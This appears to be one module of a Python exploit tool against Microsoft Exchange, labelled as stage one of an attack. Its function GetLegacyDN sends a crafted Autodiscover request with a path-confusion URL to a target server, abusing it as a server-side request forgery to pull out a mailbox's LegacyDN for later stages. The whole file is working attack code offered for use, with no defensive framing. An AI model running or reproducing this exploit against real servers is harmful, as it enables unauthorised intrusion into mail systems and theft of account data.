from main import *

def GetLegacyDN(target, email):
    logger.debug("[Stage 1] Performing SSRF attack against Autodiscover")
    autoDiscoverBody = convertFromTemplate({'email': email}, templatesFolder + "GetLegacyDN.xml")
    stage1 = requests.post(
        f"https://{target}/autodiscover/autodiscover.json?a=fun@fuk.fuk/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json?a=fun@fuk.fuk",
        headers={
            "Content-Type": "text/xml",
            "User-Agent": user_agent},
        data=autoDiscoverBody,
        verify=False
    )
    # If status code 200 is NOT returned, the request failed
    if stage1.status_code != 200:
        logger.error("[Stage 1] Request failed - Autodiscover Error! ResponseCode:{}".format(stage1.status_code))

    # If the LegacyDN information is not in the response, the request failed as well
    if "<LegacyDN>" not in stage1.content.decode('utf8').strip():
        logger.error(
            "[Stage 1] Cannot obtain required LegacyDN-information Error! ResponseCode:{}".format(stage1.status_code))

    # Define LegacyDN for further use in the script
    legacyDn = stage1.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]

    # print("[Stage 1] Successfully obtained DN: " + legacyDn)
    return legacyDn